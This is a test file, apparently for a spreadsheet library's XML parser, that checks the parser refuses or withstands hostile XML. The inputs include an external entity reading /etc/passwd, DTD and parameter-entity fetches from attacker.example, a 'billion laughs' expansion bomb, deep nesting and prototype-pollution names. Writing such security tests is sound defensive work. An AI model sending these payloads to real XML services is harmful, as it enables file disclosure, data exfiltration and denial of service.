// Hostile XML: external entities, entity expansion, deep nesting, prototype keys.
import { describe, expect, it } from 'vitest';
import { XlvError } from '../../packages/xlvane/src/errors';
import { DEFAULT_READ_LIMITS } from '../../packages/xlvane/src/limits';
import { parseXml } from '../../packages/xlvane/src/xml/parser';
import { parseXmlTree } from '../../packages/xlvane/src/xml/tree';
import { expectPrototypesUntouched } from '../helpers/prototypes';

const opts = { part: '/xl/workbook.xml', limits: DEFAULT_READ_LIMITS };
const noop = { start: () => {}, end: () => {}, text: () => {} };

function code(xml: string, options = opts): string {
  try {
    parseXml(xml, noop, options);
  } catch (error) {
    if (error instanceof XlvError) return error.code;
    throw error;
  }
  return 'ok';
}

describe('XML attacks', () => {
  it('rejects an external entity (XXE) before anything is resolved', () => {
    const xml = '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>';
    expect(code(xml)).toBe('XLV_E_XML_DTD_FORBIDDEN');
  });

  it('rejects an external DTD subset', () => {
    expect(code('<!DOCTYPE a SYSTEM "http://attacker.example/x.dtd"><a/>')).toBe('XLV_E_XML_DTD_FORBIDDEN');
    expect(code('<!DOCTYPE a PUBLIC "-//X//EN" "x.dtd"><a/>')).toBe('XLV_E_XML_DTD_FORBIDDEN');
  });

  it('rejects "billion laughs" entity expansion', () => {
    const decls = ['<!ENTITY l0 "lol">'];
    for (let i = 1; i < 10; i++) decls.push(`<!ENTITY l${i} "${`&l${i - 1};`.repeat(10)}">`);
    const xml = `<?xml version="1.0"?><!DOCTYPE lolz [${decls.join('')}]><lolz>&l9;</lolz>`;
    const start = performance.now();
    expect(code(xml)).toBe('XLV_E_XML_DTD_FORBIDDEN');
    expect(performance.now() - start).toBeLessThan(50);
  });

  it('rejects parameter entities', () => {
    const xml = '<!DOCTYPE a [<!ENTITY % p SYSTEM "http://attacker.example/p.dtd"> %p;]><a/>';
    expect(code(xml)).toBe('XLV_E_XML_DTD_FORBIDDEN');
  });

  it('rejects a DOCTYPE with lowercase or mixed whitespace as malformed or forbidden, never parsed', () => {
    expect(['XLV_E_XML_DTD_FORBIDDEN', 'XLV_E_XML_MALFORMED']).toContain(code('<!doctype a><a/>'));
    expect(code('<!DOCTYPE\na><a/>')).toBe('XLV_E_XML_DTD_FORBIDDEN');
  });

  it('rejects entity references when there is no DTD', () => {
    expect(code('<a>&x;</a>')).toBe('XLV_E_XML_ENTITY_FORBIDDEN');
    expect(code('<a v="&x;"/>')).toBe('XLV_E_XML_ENTITY_FORBIDDEN');
  });

  it('stops at the depth limit on 100 000 nested elements', () => {
    const xml = '<a>'.repeat(100_000) + '</a>'.repeat(100_000);
    expect(code(xml)).toBe('XLV_E_LIMIT_EXCEEDED');
  });

  it('parses 100 000 nested elements without a stack overflow when the depth limit is off', () => {
    const xml = '<a>'.repeat(100_000) + '</a>'.repeat(100_000);
    expect(code(xml, { ...opts, limits: { ...DEFAULT_READ_LIMITS, maxXmlDepth: Number.POSITIVE_INFINITY } })).toBe('ok');
    const tree = parseXmlTree(xml, {
      ...opts,
      limits: { ...DEFAULT_READ_LIMITS, maxXmlDepth: Number.POSITIVE_INFINITY },
    });
    expect(tree.local).toBe('a');
  });

  it('handles very many attributes and long values within linear time', () => {
    const many = Array.from({ length: 256 }, (_, i) => `a${i}="${'x'.repeat(1000)}"`).join(' ');
    const start = performance.now();
    expect(code(`<a ${many}/>`)).toBe('ok');
    expect(code(`<a ${many} extra="1"/>`)).toBe('XLV_E_LIMIT_EXCEEDED');
    expect(performance.now() - start).toBeLessThan(500);
  });

  it('does not slow down on pathological character data', () => {
    const inputs = [
      `<a>${'&'.repeat(1)}${'#'.repeat(100_000)}</a>`,
      `<a>${']'.repeat(100_000)}</a>`,
      `<a>${'<!-'.repeat(30_000)}</a>`,
      `<a v="${'&#'.repeat(50_000)}"/>`,
      `<${'a'.repeat(100_000)}/>`,
    ];
    for (const xml of inputs) {
      const start = performance.now();
      code(xml);
      expect(performance.now() - start).toBeLessThan(200);
    }
  });

  it('treats __proto__, constructor and prototype as ordinary names', () => {
    const xml =
      '<__proto__ xmlns:__proto__="urn:p" __proto__:polluted="yes" constructor="c" prototype="p">' +
      '<constructor/><prototype/></__proto__>';
    const tree = parseXmlTree(xml, opts);
    expect(tree.local).toBe('__proto__');
    expect(tree.attrs.get('{urn:p}polluted')).toBe('yes');
    expect(tree.children.map((c) => c.local)).toEqual(['constructor', 'prototype']);
    expectPrototypesUntouched();
  });
});
